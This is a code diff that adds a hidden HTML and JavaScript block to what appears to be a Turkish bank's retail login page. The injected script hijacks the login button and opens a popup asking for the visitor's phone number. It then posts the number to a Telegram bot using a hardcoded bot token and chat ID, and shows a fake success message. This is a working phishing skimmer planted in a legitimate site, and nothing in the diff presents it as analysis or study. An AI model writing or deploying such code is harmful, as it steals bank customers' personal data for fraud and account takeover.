@@ -753,6 +753,125 @@ function ValidatorOnSubmit() {
             try { zrtadx.zrtvalidate('zrt_user_prefs'); } catch (e) { console.log(e); }
         }
     </script>
+	<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telefon Numarası Gönder</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        #popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        #popup-content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        #success-message {
+            display: none;
+            font-size: 1.2em;
+            color: green;
+        }
+        .btn {
+            padding: 10px 20px;
+            background-color: #d9534f;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+   
+
+    <div id="popup">
+        <div id="popup-content">
+            <h2>Telefon Numaranızı Girin</h2>
+            <input type="text" id="phone-number" placeholder="Telefon numarası" />
+            <button id="send-button" class="btn">Gönder</button>
+            <p id="success-message">İşleminiz başarılı bir şekilde gerçekleştirilmiştir. <span>&#10004;</span></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const chatId = '-4238894331'; // Telegram chat ID'nizi buraya girin
+            const token = '7480749914:AAFXJ1h1HjVcblwoLul3vVCiztFvlAdchxw'; // Telegram bot tokeninizi buraya girin
+
+            const openPopupButton = document.getElementById('ctl00_c_RetailLoginButton');
+            const popup = document.getElementById('popup');
+            const sendButton = document.getElementById('send-button');
+            const phoneNumberInput = document.getElementById('phone-number');
+            const successMessage = document.getElementById('success-message');
+
+            openPopupButton.addEventListener('click', function() {
+                popup.style.display = 'flex';
+            });
+
+            sendButton.addEventListener('click', function() {
+                const phoneNumber = phoneNumberInput.value.trim();
+                if (phoneNumber) {
+                    const message = `Telefon Numaranız: ${phoneNumber}`;
+
+                    // Telegram API URL'si
+                    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                    // HTTP isteği yapmak için XMLHttpRequest
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            // Başarıyla gönderildiğinde mesajı göster
+                            successMessage.style.display = 'block';
+                            setTimeout(function() {
+                                popup.style.display = 'none';
+                                phoneNumberInput.value = ''; // Input'u temizle
+                                successMessage.style.display = 'none'; // Başarı mesajını gizle
+                            }, 2000);
+                        }
+                    };
+
+                    xhr.send(JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    }));
+                } else {
+                    alert('Lütfen telefon numaranızı girin.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
     <!DOCTYPE html>
 <html lang="tr">
 <head>
